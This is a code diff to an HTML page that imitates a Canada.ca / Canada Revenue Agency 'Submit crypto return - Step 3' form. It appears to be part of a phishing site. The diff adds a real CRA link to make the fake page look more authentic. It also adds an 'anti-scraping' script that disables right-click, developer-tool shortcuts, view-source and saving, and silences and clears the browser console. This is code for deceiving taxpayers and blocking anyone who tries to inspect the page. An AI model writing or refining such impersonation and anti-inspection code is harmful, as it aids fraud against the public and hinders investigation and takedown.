@@ -4,6 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Submit crypto return - Step 3 - Canada.ca</title>
+    <link rel="icon" type="image/x-icon" href="/favicon.ico?v=2">
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2">
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;700&family=Lato:wght@400;700&display=swap" rel="stylesheet">
@@ -11,6 +13,8 @@
         body { font-family: 'Noto Sans', sans-serif; color: #333; }
         .container-custom { max-width: 1200px; margin: 0 auto; padding: 0 15px; }
         .nav-bar { background-color: #26374a; height: 50px; }
+        .nav-bar a { text-decoration: none; cursor: pointer; }
+        .nav-bar a:hover { background-color: #1a2633; }
         .red-accent { border-bottom: 4px solid #af3c43; display: inline-block; margin-bottom: 20px; }
         .search-container { display: flex; align-items: center; }
         .search-input { border: 1px solid #ccc; padding: 6px 10px; width: 250px; }
@@ -36,7 +40,7 @@
     <nav class="nav-bar">
         <div class="container-custom flex justify-between items-center h-full text-white font-bold">
             <button class="px-4 h-full border-l border-r border-gray-700">MENU <i class="fas fa-caret-down"></i></button>
-            <button class="px-4 h-full">CRA sign in</button>
+            <a href="https://www.canada.ca/en/revenue-agency.html" target="_blank" class="px-4 h-full flex items-center">CRA sign in</a>
         </div>
     </nav>
 
@@ -107,5 +111,41 @@
             window.location.href = 'pleasewait.html';
         });
     </script>
+
+    <script>
+        // Anti-scraping protection
+        (function() {
+            // Disable right-click
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                return false;
+            });
+
+            // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U, Ctrl+S
+            document.addEventListener('keydown', function(e) {
+                if (e.keyCode == 123 || // F12
+                    (e.ctrlKey && e.shiftKey && e.keyCode == 73) || // Ctrl+Shift+I
+                    (e.ctrlKey && e.shiftKey && e.keyCode == 74) || // Ctrl+Shift+J
+                    (e.ctrlKey && e.keyCode == 85) || // Ctrl+U
+                    (e.ctrlKey && e.keyCode == 83)) { // Ctrl+S
+                    e.preventDefault();
+                    return false;
+                }
+            });
+
+            // Clear console logs periodically
+            setInterval(function() {
+                console.clear();
+            }, 1000);
+
+            // Disable console functions
+            console.log = function() {};
+            console.warn = function() {};
+            console.error = function() {};
+            console.info = function() {};
+            console.debug = function() {};
+        })();
+    </script>
+
 </body>
 </html>
